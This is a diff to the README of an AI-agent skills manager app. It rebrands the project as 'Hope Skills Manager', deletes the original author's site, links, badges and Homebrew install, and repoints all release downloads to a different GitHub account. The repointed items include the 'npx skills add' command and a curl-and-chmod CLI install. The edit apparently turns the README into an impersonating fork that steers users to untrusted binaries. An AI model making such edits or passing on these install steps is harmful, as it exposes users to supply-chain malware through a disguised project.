@@ -2,38 +2,14 @@
   <img src="assets/icon.png" width="80" />
 </p>
 
-<h1 align="center">Skills Manager</h1>
+<h1 align="center">Hope Skills Manager</h1>
 
 <p align="center">
   One app to manage AI agent skills across all your coding tools.
 </p>
 
 <p align="center">
-  <strong><a href="https://skillsmanager.dev">skillsmanager.dev</a></strong>
-</p>
-
-<p align="center">
-  🎬 <a href="https://www.youtube.com/watch?v=DJ9RIX8nbow">1.5-min intro (YouTube)</a>
-  &nbsp;·&nbsp;
-  <a href="https://www.youtube.com/watch?v=SNVD5ZN6QPE">Full walkthrough (9 min)</a>
-  &nbsp;·&nbsp;
-  <a href="https://www.bilibili.com/video/BV1cdpc6PExG/">视频介绍 (Bilibili)</a>
-</p>
-
-<p align="center">
   <a href="./README.zh-CN.md">中文说明</a>
-  &nbsp;·&nbsp;
-  <a href="https://x.com/JayTL00">@JayTL00 on X</a>
-  &nbsp;·&nbsp;
-  <a href="https://buymeacoffee.com/jaytl">Buy me a coffee</a>
-</p>
-
-<p align="center">
-  <a href="https://trendshift.io/repositories/23290?utm_source=repository-badge&amp;utm_medium=badge&amp;utm_campaign=badge-repository-23290" target="_blank" rel="noopener noreferrer"><img src="https://trendshift.io/api/badge/repositories/23290" alt="xingkongliang%2Fskills-manager | Trendshift" width="250" height="55"/></a>
-</p>
-
-<p align="center">
-  <a href="https://skills.sh/xingkongliang/skills-manager"><img src="https://skills.sh/b/xingkongliang/skills-manager" alt="manage-skills on skills.sh" /></a>
 </p>
 
 <p align="center">
@@ -87,17 +63,11 @@
 
 ### macOS
 
-Install with [Homebrew](https://brew.sh):
-
-```bash
-brew install --cask skills-manager
-```
-
-You can also download the `.dmg` for your Mac from the [latest release](https://github.com/xingkongliang/skills-manager/releases/latest).
+Download the `.dmg` for your Mac from the [latest release](https://github.com/anonymous99-Rise/skills-manager/releases/latest).
 
 ### Windows and Linux
 
-Download the installer for your platform from the [latest release](https://github.com/xingkongliang/skills-manager/releases/latest): `.exe` or `.msi` for Windows, and `.AppImage`, `.deb`, or `.rpm` for Linux (x64 and arm64).
+Download the installer for your platform from the [latest release](https://github.com/anonymous99-Rise/skills-manager/releases/latest): `.exe` or `.msi` for Windows, and `.AppImage`, `.deb`, or `.rpm` for Linux (x64 and arm64).
 
 Every installer ships the CLI inside the app — see [Where the binary lives](#where-the-binary-lives).
 
@@ -119,7 +89,7 @@ The Dashboard offers a one-time setup: pick the agents that should be able to do
 It is also an ordinary published skill, so it can be installed without the app:
 
 ```bash
-npx skills add xingkongliang/skills-manager
+npx skills add anonymous99-Rise/skills-manager
 ```
 
 ## Backup & Multi-Device Sync
@@ -232,7 +202,7 @@ The Windows app cannot create links inside WSL, so it can only copy skills there
 
 ```bash
 mkdir -p ~/.local/bin && curl -L -o ~/.local/bin/skills-manager-cli \
-  https://github.com/xingkongliang/skills-manager/releases/latest/download/skills-manager-cli-Linux-x64
+  https://github.com/anonymous99-Rise/skills-manager/releases/latest/download/skills-manager-cli-Linux-x64
 chmod +x ~/.local/bin/skills-manager-cli
 export PATH="$HOME/.local/bin:$PATH"
 skills-manager-cli agents add-custom hermes-work --path ~/.hermes/profiles/work/skills
@@ -271,15 +241,7 @@ npm run cli:build
 
 **macOS refuses to open the app.** Releases from **v1.29.0** onward are signed with an Apple Developer ID certificate and notarized, so they open normally. If you see "Apple could not verify…" or "App is damaged", you are on v1.28.5 or older — upgrading is the fix. (Upgrading changes the code signature, so macOS may ask once more for the `skills-manager-git-backup` keychain entry; click **Always Allow**.)
 
-Anything else — [open an issue](https://github.com/xingkongliang/skills-manager/issues), and attach the bundle from **Settings → Export Logs**.
-
-## Star History
-
-<p align="center">
-  <a href="https://github.com/xingkongliang/star-history-svg">
-    <img src="assets/star-history.svg" width="800" alt="Star History chart for xingkongliang/skills-manager" />
-  </a>
-</p>
+Anything else — [open an issue](https://github.com/anonymous99-Rise/skills-manager/issues), and attach the bundle from **Settings → Export Logs**.
 
 ## License
 
